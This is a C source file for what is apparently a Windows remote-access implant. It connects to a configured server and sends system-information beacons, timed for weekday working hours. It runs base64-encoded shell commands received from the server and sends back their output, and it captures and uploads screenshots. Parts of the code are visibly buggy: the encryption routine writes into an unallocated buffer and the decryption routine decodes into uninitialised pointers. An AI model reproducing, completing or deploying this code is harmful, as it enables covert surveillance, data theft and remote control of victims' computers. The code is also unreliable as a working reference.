#include "client.h"

void log_it(const char* format, ...) {
    if (!LOGGING || !log_file) {
        return;
    }

    va_list args;
    va_start(args, format);

    time_t now;
    time(&now);
    char timestamp[26];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));

    // Print timestamp
    fprintf(log_file, "[%s] ", timestamp);

    // Print the actual message
    vfprintf(log_file, format, args);

    // Add a newline if it's not already there
    if (format[strlen(format) - 1] != '\n') {
        fprintf(log_file, "\n");
    }

    fflush(log_file);

    va_end(args);
}

char* get_ip_address(char* ipAddress, size_t ip_len) {
    // Example logic: Assign the IPv6 loopback address ::1
    snprintf(ipAddress, ip_len, "::1");

    // Replace ::1 with 127.0.0.1
    if (strcmp(ipAddress, "::1") == 0) {
        strncpy(ipAddress, "127.0.0.1", ip_len);
    }

    return ipAddress;
}

void get_session_id() {
    char ip_address[IP_ADDRESS_LENGTH] = {0};
    get_ip_address(ip_address, sizeof(ip_address));

    log_it("IP Address: %s", ip_address);  // Log the IP address

    int sum = 0;
    char* token = strtok(ip_address, ".");
    while (token != NULL) {
        sum += atoi(token);
        token = strtok(NULL, ".");
    }

    char input[IP_ADDRESS_LENGTH + 12];
    snprintf(input, sizeof(input), "%s<>%d", ip_address, sum);

    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((unsigned char*)input, strlen(input), hash);

    for (int i = 0; i < SESSION_ID_LENGTH / 2; i++) {
        snprintf(&SESSION_ID[i * 2], 3, "%02x", hash[i]);
    }

    SESSION_ID[SESSION_ID_LENGTH] = '\0';  // Null-terminate the string

    log_it("Session ID: %s", SESSION_ID);  // Log the Session ID
}

size_t b64_encoded_size(size_t inlen) {
	size_t ret;

	ret = inlen;
	if (inlen % 3 != 0)
		ret += 3 - (inlen % 3);
	ret /= 3;
	ret *= 4;

	return ret;
}

size_t b64_decoded_size(const char *in)
{
	size_t len;
	size_t ret;
	size_t i;

	if (in == NULL)
		return 0;

	len = strlen(in);
	ret = len / 4 * 3;

	for (i=len; i-->0; ) {
		if (in[i] == '=') {
			ret--;
		} else {
			break;
		}
	}

	return ret;
}

void b64_generate_decode_table() {
	int    inv[80];
	size_t i;

	memset(inv, -1, sizeof(inv));
	for (i=0; i<sizeof(base64_chars)-1; i++) {
		inv[base64_chars[i]-43] = i;
	}
}

int b64_isvalidchar(char c) {
	if (c >= '0' && c <= '9')
		return 1;
	if (c >= 'A' && c <= 'Z')
		return 1;
	if (c >= 'a' && c <= 'z')
		return 1;
	if (c == '+' || c == '/' || c == '=')
		return 1;
	return 0;
}

// Function to encode base64
char *base64_encode(const unsigned char *in, size_t len) {
	char   *out;
	size_t  elen;
	size_t  i;
	size_t  j;
	size_t  v;

	if (in == NULL || len == 0)
		return NULL;

	elen = b64_encoded_size(len);
	out  = malloc(elen+1);
	out[elen] = '\0';

	for (i=0, j=0; i<len; i+=3, j+=4) {
		v = in[i];
		v = i+1 < len ? v << 8 | in[i+1] : v << 8;
		v = i+2 < len ? v << 8 | in[i+2] : v << 8;

		out[j]   = base64_chars[(v >> 18) & 0x3F];
		out[j+1] = base64_chars[(v >> 12) & 0x3F];
		if (i+1 < len) {
			out[j+2] = base64_chars[(v >> 6) & 0x3F];
		} else {
			out[j+2] = '=';
		}
		if (i+2 < len) {
			out[j+3] = base64_chars[v & 0x3F];
		} else {
			out[j+3] = '=';
		}
	}

	return out;
}

// Function to decode a Base64 encoded string into binary data
int base64_decode(const char *in, unsigned char *out, size_t outlen) {
	size_t len;
	size_t i;
	size_t j;
	int    v;

	if (in == NULL || out == NULL)
		return 0;

	len = strlen(in);
	if (outlen < b64_decoded_size(in) || len % 4 != 0)
		return 0;

	for (i=0; i<len; i++) {
		if (!b64_isvalidchar(in[i])) {
			return 0;
		}
	}

	for (i=0, j=0; i<len; i+=4, j+=3) {
		v = base64_invs[in[i]-43];
		v = (v << 6) | base64_invs[in[i+1]-43];
		v = in[i+2]=='=' ? v << 6 : (v << 6) | base64_invs[in[i+2]-43];
		v = in[i+3]=='=' ? v << 6 : (v << 6) | base64_invs[in[i+3]-43];

		out[j] = (v >> 16) & 0xFF;
		if (in[i+2] != '=')
			out[j+1] = (v >> 8) & 0xFF;
		if (in[i+3] != '=')
			out[j+2] = v & 0xFF;
	}

	return 1;
}

// Encryption function
char* encrypt_data(const char *data, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], key[KEY_LENGTH];
    unsigned char auth_tag[TAG_LENGTH];
    unsigned char *encrypted_data = NULL;
    int len, encrypted_data_len;
    EVP_CIPHER_CTX *ctx;

    // Generate random salt and IV
    RAND_bytes(salt, SALT_LENGTH);
    RAND_bytes(iv, IV_LENGTH);

    // Derive key
    PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);

    // Initialize encryption context
    ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_LENGTH, NULL);
    EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv);

    // Encrypt the data
    EVP_EncryptUpdate(ctx, encrypted_data, &len, (unsigned char *)data, strlen(data));
    encrypted_data_len = len;
    EVP_EncryptFinal_ex(ctx, encrypted_data + len, &len);
    encrypted_data_len += len;

    // Get the authentication tag
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_LENGTH, auth_tag);

    EVP_CIPHER_CTX_free(ctx);

    // Encode to base64
    char *salt_b64 = base64_encode(salt, SALT_LENGTH);
    char *iv_b64 = base64_encode(iv, IV_LENGTH);
    char *auth_tag_b64 = base64_encode(auth_tag, TAG_LENGTH);
    char *encrypted_data_b64 = base64_encode(encrypted_data, encrypted_data_len);

    log_it("Salt b64: %s", salt_b64);
    log_it("Salt b64: %s", salt_b64);
    log_it("Salt b64: %s", salt_b64);

    // Prepare the result string
    char *result = (char *)malloc(strlen(salt_b64) + strlen(iv_b64) + strlen(auth_tag_b64) + strlen(encrypted_data_b64) + 4);
    snprintf(result, strlen(result), "%s:%s:%s:%s", salt_b64, iv_b64, auth_tag_b64, encrypted_data_b64);

    OPENSSL_cleanse(key, strlen(key));
    free(salt_b64);
    free(iv_b64);
    free(auth_tag_b64);
    free(encrypted_data_b64);
    return result;
}

// Decryption function
char* decrypt_data(const char *encrypted, const char *shared_key) {
    unsigned char salt[SALT_LENGTH], iv[IV_LENGTH], auth_tag[TAG_LENGTH];
    unsigned char encrypted_data[CHUNK_SIZE];
    unsigned char key[KEY_LENGTH];
    int encrypted_data_len, decrypted_len;
    EVP_CIPHER_CTX *ctx;

    // Make a copy of the input string to avoid modifying the original
    char *encrypted_copy = strdup(encrypted);
    if (!encrypted_copy) {
        return NULL; // Memory allocation failure
    }

    // Split the encrypted string
    char *parts[4];
    char *token = strtok(encrypted_copy, ":");
    for (int i = 0; i < 4; i++) {
        if (token) {
            parts[i] = token;
            token = strtok(NULL, ":");
        } else {
            free(encrypted_copy); // Clean up
            return NULL; // Invalid input
        }
    }
    
    unsigned char *salt_b64, *iv_b64, *auth_tag_b64, *encrypted_data_b64;

    base64_decode(parts[0], salt_b64, SALT_LENGTH);
    memcpy(salt, salt_b64, SALT_LENGTH);

    base64_decode(parts[1], iv_b64, IV_LENGTH);
    memcpy(iv, iv_b64, IV_LENGTH);

    base64_decode(parts[2], auth_tag_b64, TAG_LENGTH);
    memcpy(auth_tag, auth_tag_b64, TAG_LENGTH);
    
    size_t out_len = b64_decoded_size(encrypted_copy)+1;
    base64_decode(parts[3], encrypted_data_b64, out_len);
    memcpy(encrypted_data, encrypted_data_b64, strlen(encrypted_copy));

    // Derive key
    PKCS5_PBKDF2_HMAC(shared_key, strlen(shared_key), salt, SALT_LENGTH, 200000, EVP_sha512(), KEY_LENGTH, key);

    // Initialize decryption context
    ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        return NULL; // Memory allocation failure
    }

    if (1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Initialization failed
    }

    if (1 != EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Initialization failed
    }

    // Decrypt the data
    if (1 != EVP_DecryptUpdate(ctx, encrypted_data, &decrypted_len, encrypted_data, encrypted_data_len)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Decryption failed
    }

    // Set the expected tag value
    if (1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, TAG_LENGTH, auth_tag)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Setting tag failed
    }

    if (1 != EVP_DecryptFinal_ex(ctx, encrypted_data + decrypted_len, &out_len)) {
        EVP_CIPHER_CTX_free(ctx);
        return NULL; // Decryption failed
    }

    decrypted_len += out_len;

    EVP_CIPHER_CTX_free(ctx);

    // Null-terminate the decrypted data
    encrypted_data[decrypted_len] = '\0';

    free(encrypted_data_b64);
    free(auth_tag_b64);
    free(iv_b64);
    free(salt_b64);
    return (char *)strdup((const char *)encrypted_data);
}

HRESULT SaveBitmapToPNG(HBITMAP hBitmap, const WCHAR* filename) {
    HRESULT hr = CoInitialize(NULL);
    if (FAILED(hr)) return hr;

    IWICImagingFactory* pFactory = NULL;
    IWICBitmap* pWICBitmap = NULL;
    IWICBitmapEncoder* pEncoder = NULL;
    IWICBitmapFrameEncode* pFrame = NULL;
    IWICStream* pStream = NULL;
    BITMAP bmp;
    void* pPixels = NULL;

    do {
        hr = CoCreateInstance(&CLSID_WICImagingFactory, NULL, CLSCTX_INPROC_SERVER, &IID_IWICImagingFactory, (LPVOID*)&pFactory);
        if (FAILED(hr)) break;

        hr = pFactory->lpVtbl->CreateStream(pFactory, &pStream);
        if (FAILED(hr)) break;

        hr = pStream->lpVtbl->InitializeFromFilename(pStream, filename, GENERIC_WRITE);
        if (FAILED(hr)) break;

        GetObject(hBitmap, sizeof(BITMAP), &bmp);
        BITMAPINFO bmpInfo = { 0 };
        bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmpInfo.bmiHeader.biWidth = bmp.bmWidth;
        bmpInfo.bmiHeader.biHeight = bmp.bmHeight;
        bmpInfo.bmiHeader.biPlanes = 1;
        bmpInfo.bmiHeader.biBitCount = 32;
        bmpInfo.bmiHeader.biCompression = BI_RGB;

        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);

        pPixels = malloc(bmp.bmWidth * bmp.bmHeight * 4);
        if (!pPixels) {
            hr = E_OUTOFMEMORY;
            break;
        }

        if (!GetDIBits(hdcMem, hBitmap, 0, bmp.bmHeight, pPixels, &bmpInfo, DIB_RGB_COLORS)) {
            hr = E_FAIL;
            break;
        }

        SelectObject(hdcMem, hOldBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);

        const WICPixelFormatGUID pixelFormat = GUID_WICPixelFormat32bppBGRA;
        hr = pFactory->lpVtbl->CreateBitmapFromMemory(pFactory, bmp.bmWidth, bmp.bmHeight, &pixelFormat, bmp.bmWidth * 4, bmp.bmWidth * bmp.bmHeight * 4, (BYTE*)pPixels, &pWICBitmap);
        if (FAILED(hr)) break;

        hr = pFactory->lpVtbl->CreateEncoder(pFactory, &GUID_ContainerFormatPng, NULL, &pEncoder);
        if (FAILED(hr)) break;

        hr = pEncoder->lpVtbl->Initialize(pEncoder, (IStream*)pStream, WICBitmapEncoderNoCache);
        if (FAILED(hr)) break;

        hr = pEncoder->lpVtbl->CreateNewFrame(pEncoder, &pFrame, NULL);
        if (FAILED(hr)) break;

        hr = pFrame->lpVtbl->Initialize(pFrame, NULL);
        if (FAILED(hr)) break;

        hr = pFrame->lpVtbl->SetSize(pFrame, bmp.bmWidth, bmp.bmHeight);
        if (FAILED(hr)) break;

        hr = pFrame->lpVtbl->SetPixelFormat(pFrame, &pixelFormat);
        if (FAILED(hr)) break;

        hr = pFrame->lpVtbl->WriteSource(pFrame, (IWICBitmapSource*)pWICBitmap, NULL);
        if (FAILED(hr)) break;

        hr = pFrame->lpVtbl->Commit(pFrame);
        if (FAILED(hr)) break;

        hr = pEncoder->lpVtbl->Commit(pEncoder);
    } while (0);

    if (pPixels) free(pPixels);
    if (pFrame) pFrame->lpVtbl->Release(pFrame);
    if (pEncoder) pEncoder->lpVtbl->Release(pEncoder);
    if (pWICBitmap) pWICBitmap->lpVtbl->Release(pWICBitmap);
    if (pStream) pStream->lpVtbl->Release(pStream);
    if (pFactory) pFactory->lpVtbl->Release(pFactory);
    CoUninitialize();

    return hr;
}

void send_command(const char* response) {
    char* encrypted = encrypt_data(response, SESSION_ID);
    if (encrypted == NULL) {
        log_it("Encryption failed");
        return;
    }

    size_t encrypted_len = strlen(encrypted);

    if (encrypted_len >= CHUNK_SIZE) {
        while (encrypted_len > 0) {
            size_t chunk_size = (encrypted_len > CHUNK_SIZE) ? CHUNK_SIZE : encrypted_len;
            char chunk[CHUNK_SIZE + 7]; // Additional space for '--FIN--' and null terminator

            // Copy the chunk of data from encrypted
            memcpy(chunk, encrypted, chunk_size);
            encrypted += chunk_size;
            encrypted_len -= chunk_size;

            if (encrypted_len == 0) {
                // Add termination marker for the last chunk
                strcat(chunk, "--FIN--");
                chunk_size += 7; // Increase chunk size to account for the '--FIN--' marker
            }

            // Send chunk to the socket
            int result = send(client_socket, chunk, chunk_size, 0);
            if (result == SOCKET_ERROR) {
                int error_code = WSAGetLastError();
                log_it("Send failed with error: %d", error_code);
                free(encrypted);
                return;
            }

            log_it("Sent Chunk: %.*s", (int)chunk_size, chunk);
        }
    } else {
        // If the encrypted data fits in one chunk
        int result = send(client_socket, encrypted, encrypted_len, 0);
        if (result == SOCKET_ERROR) {
            int error_code = WSAGetLastError();
            fprintf(stderr, "Send failed with error: %d", error_code);
            free(encrypted);
            return;
        }

        // Log the sent data
        log_it("Sent Data: %s", encrypted);
    }
    free(encrypted);
}

void send_beacon() {
    SYSTEM_INFO sysInfo;
    OSVERSIONINFOEX osInfo;
    char hostname[256];
    DWORD size = sizeof(hostname);

    // Get system information
    GetSystemInfo(&sysInfo);
    ZeroMemory(&osInfo, sizeof(OSVERSIONINFOEX));
    osInfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO)&osInfo);
    GetComputerNameA(hostname, &size);

    // Prepare the beacon message
    char beacon[300];
    const char* beacon_format = "{\"response\": {\"beacon\": true,\"version\": \"%s\",\"type\": \"%s\",\"platform\": \"Windows\",\"arch\": \"%s\",\"osver\": \"%lu.%lu.%lu\",\"hostname\": \"%s\"}}";
    const char* arch = sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86";

    // Format the beacon message into the buffer
    snprintf(beacon, sizeof(beacon), beacon_format, CVER, TYPE, arch, osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber, hostname);

    // Send the command with the formatted beacon message
    send_command(beacon);
}

void sleep_ms(int milliseconds) {
    Sleep(milliseconds);
}

// Function to get a retry interval
int get_retry_interval(int retries) {
    size_t num_intervals = sizeof(RETRY_INTERVALS) / sizeof(RETRY_INTERVALS[0]);
    if ((size_t)retries < num_intervals) {
        return RETRY_INTERVALS[retries];
    }
    return RETRY_INTERVALS[num_intervals - 1];
}

// Function to convert UTF-8 to UTF-16
WCHAR* utf8_to_utf16(const char* str) {
    int len = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    WCHAR* result = malloc(len * sizeof(WCHAR));
    if (!result) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, str, -1, result, len);
    return result;
}

// Function to simulate setInterval for beacon
DWORD WINAPI beacon_interval_thread(LPVOID lpParam) {
    (void)lpParam;
    while (!exit_process) {
        sleep_ms(BEACON_MIN_INTERVAL + (rand() % (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1)));
        
        SYSTEMTIME st;
        GetLocalTime(&st);
        
        // Check if it's Monday through Friday (1-5) and between 7 AM and 7 PM
        if (st.wDayOfWeek >= 1 && st.wDayOfWeek <= 5 && 
            st.wHour >= 7 && st.wHour <= 19) {
            send_beacon();
        }
    }
    return 0;
}

// Function to start beacon interval thread
void start_beacon_interval() {
    // send first beacon
    send_beacon();

    CreateThread(NULL, 0, beacon_interval_thread, NULL, 0, NULL);
}

// Function to handle screenshot (placeholder)
void run_screenshot() {
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);

    if (!hdcMem || !hBitmap || !BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
        log_it("Failed to capture screenshot\n");
        if (hBitmap) DeleteObject(hBitmap);
        if (hdcMem) DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return;
    }

    const WCHAR* filename = L"screenshot.png";
    HRESULT hr = SaveBitmapToPNG(hBitmap, filename);
    
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    if (SUCCEEDED(hr)) {
        // Read the file and encode it
        FILE* file = _wfopen(filename, L"rb");
        if (file) {
            fseek(file, 0, SEEK_END);
            long file_size = ftell(file);
            fseek(file, 0, SEEK_SET);

            unsigned char* file_data = malloc(file_size);
            if (file_data) {
                fread(file_data, 1, file_size, file);
                char* base64_data = base64_encode(file_data, file_size);
                if (base64_data) {
                    // Prepare and send the command
                    char* command = malloc(strlen(base64_data) + 100);
                    if (command) {
                        sprintf(command, "{\"response\": {\"name\": \"screenshot.png\", \"data\": \"%s\"}}", base64_data);
                        send_command(command);
                        free(command);
                    }
                    free(base64_data);
                }
                free(file_data);
            }
            fclose(file);
        }
        // Optionally, delete the file after sending
        _wremove(filename);
    } else {
        log_it("Failed to save screenshot");
    }
}

// Function to handle webcam (placeholder)
void run_webcam_clip() {
    // This would require platform-specific libraries
    send_command("{\"response\": {\"error\": \"Webcam functionality not implemented\"}}");
}

// Function to parse and execute action
void parse_action(const char* action) {
    char* action_copy = _strdup(action);
    char* command = strtok(action_copy, " ");

    if (command == NULL) {
        send_command("{\"response\": {\"error\": \"No command provided\"}}");
        free(action_copy);
        return;
    }

    if (strcmp(command, "up") == 0) {
        get_uptime();
    } else if (strcmp(command, "di") == 0) {
        exit_process = 1;
        send_command("{\"response\": {\"data\": \"Disconnecting...\"}}");
    } else if (strcmp(command, "cmd") == 0 || strcmp(command, "ps") == 0) {
        char* payload = strtok(NULL, "");
        if (payload) {
            int decoded_len = EVP_DecodeBlock(NULL, (const unsigned char*)payload, strlen(payload));
            char* decoded_payload = malloc(decoded_len + 1);
            if (decoded_payload) {
                EVP_DecodeBlock((unsigned char*)decoded_payload, (const unsigned char*)payload, strlen(payload));
                decoded_payload[decoded_len] = '\0';  // Null-terminate the string
                char* result = run_command(decoded_payload);
                char* response = malloc(strlen(result) + 64);  // 64 for the JSON wrapper
                if (response) {
                    snprintf(response, strlen(result) + 64, "{\"response\": {\"data\": \"%s\"}}", result);
                    send_command(response);
                    free(response);
                } else {
                    send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
                }
                free(result);
                free(decoded_payload);
            } else {
                send_command("{\"response\": {\"error\": \"Memory allocation failed\"}}");
            }
        } else {
            send_command("{\"response\": {\"error\": \"No payload provided\"}}");
        }
    } else if (strcmp(command, "ss") == 0) {
        run_screenshot();
    } else if (strcmp(command, "wc") == 0) {
        run_webcam_clip();
    } else {
        char error_msg[100];
        snprintf(error_msg, sizeof(error_msg), "{\"response\": {\"error\": \"Unsupported command: %s\"}}", command);
        send_command(error_msg);
    }

    free(action_copy);
}

// Function to format file name
char* format_file_name(const char* name, const char* extension) {
    time_t now;
    struct tm tm_info;
    char timestamp[20];
    char* file_name = malloc(100);  // Adjust size as needed

    if (!file_name) {
        free(file_name);
        return NULL;
    }

    time(&now);
    localtime_s(&tm_info, &now);
    strftime(timestamp, 20, "%Y-%m-%d_%H-%M-%S", &tm_info);

    snprintf(file_name, sizeof(file_name), "%s_%s.%s", name, timestamp, extension);
    return file_name;
}

// Function to format time
char* format_time(long milliseconds) {
    long total_seconds = milliseconds / 1000;
    int days = (int)(total_seconds / 86400);
    int hours = (int)((total_seconds % 86400) / 3600);
    int minutes = (int)((total_seconds % 3600) / 60);
    int seconds = (int)(total_seconds % 60);

    char* formatted_time = malloc(50);  // Adjust size as needed
    if (!formatted_time) {
        free(formatted_time);
        return NULL;
    }
    snprintf(formatted_time, sizeof(formatted_time), "%dd %dh %dm %ds", days, hours, minutes, seconds);
    return formatted_time;
}

// Function to get uptime
void get_uptime() {
    time_t current_time;
    time(&current_time);
    long uptime_millis = (long)(difftime(current_time, start_time) * 1000);
    char* uptime = format_time(uptime_millis);
    
    if (uptime) {
        char response[256];
        snprintf(response, sizeof(response), "{\"response\": {\"data\": \"%s\"}}", uptime);
        send_command(response);
        free(uptime);
    } else {
        send_command("{\"response\": {\"error\": \"Failed to get uptime\"}}");
    }
}

// Function to run a command
char* run_command(const char* command) {
    char* output = NULL;
    size_t output_size = 0;
    char buffer[128];
    FILE* pipe = _popen(command, "r");

    if (!pipe) {
        return _strdup("Failed to run command");
    }

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        size_t len = strlen(buffer);
        char* new_output = realloc(output, output_size + len + 1);
        if (!new_output) {
            free(output);
            _pclose(pipe);
            return _strdup("Memory allocation failed");
        }
        output = new_output;
        strncpy(output + output_size, buffer, len + 1);
        output_size += len;
        // null terminate
        output[output_size] = '\0';
    }

    _pclose(pipe);
    return output ? output : _strdup("");
}

// Function to handle connection and communication
void handle_connection() {
    char buffer[CHUNK_SIZE] = {0};
    while (!exit_process) {
        int valread = recv(client_socket, buffer, CHUNK_SIZE, 0);
        if (valread > 0) {
            char* decrypted = decrypt_data(buffer, SESSION_ID);
            if (decrypted) {
                parse_action(decrypted);
            }
            free(decrypted);
            ZeroMemory(buffer, CHUNK_SIZE);
        } else if (valread == 0) {
            log_it("Server disconnected");
            break;
        } else {
            log_it("Read error");
            break;
        }
    }
}

int connect_to_server() {
    WSADATA wsaData;
    int iResult;
    struct addrinfo *result = NULL, *ptr = NULL, hints;
    char port_str[6];
    int retry_count = 0;
    const int max_retries = 3;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        log_it("WSAStartup failed with error: %d", iResult);
        return -1;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    snprintf(port_str, strlen(port_str), "%d", SERVER_PORT);

    // Resolve the server address and port
    iResult = getaddrinfo(SERVER_ADDRESS, port_str, &hints, &result);
    if (iResult != 0) {
        log_it("getaddrinfo failed with error: %d", iResult);
        WSACleanup();
        return -1;
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        // Create a SOCKET for connecting to server
        client_socket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (client_socket == INVALID_SOCKET) {
            log_it("Socket creation failed with error: %ld", WSAGetLastError());
            freeaddrinfo(result);
            WSACleanup();
            return -1;
        }

        // Connect to server
        iResult = connect(client_socket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(client_socket);
            client_socket = INVALID_SOCKET;
            retry_count++;
            if (retry_count >= max_retries) {

                log_it("Connect attempt %d failed", retry_count);
                break;
            }
            log_it("Connect attempt %d failed, retrying...", retry_count);
            Sleep(1000 * retry_count); // Exponential backoff
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (client_socket == INVALID_SOCKET) {
        log_it("Unable to connect to server after %d attempts", max_retries);
        WSACleanup();
        return -1;
    }

    // Set receive timeout
    DWORD timeout = 5000; // 5 seconds
    setsockopt(client_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

    log_it("Connected to server successfully");
    
    // Generate and store session ID
    get_session_id();

    return 0;
}

int main() {
    log_file = fopen("client.log", "a");
    if (!log_file) {
        fprintf(stderr, "Failed to open log file\n");
        return 1;
    }

    time(&start_time);
    
    while (!exit_process) {
        if (connect_to_server() < 0) {
            log_it("Failed to connect to server");
            sleep_ms(get_retry_interval(MAX_RETRIES));
        } else {
            // Send initial beacon
            start_beacon_interval();
            handle_connection();
        }
    }

    if (client_socket != INVALID_SOCKET) {
        closesocket(client_socket);
    }
    WSACleanup();
    fclose(log_file);
    return 0;
}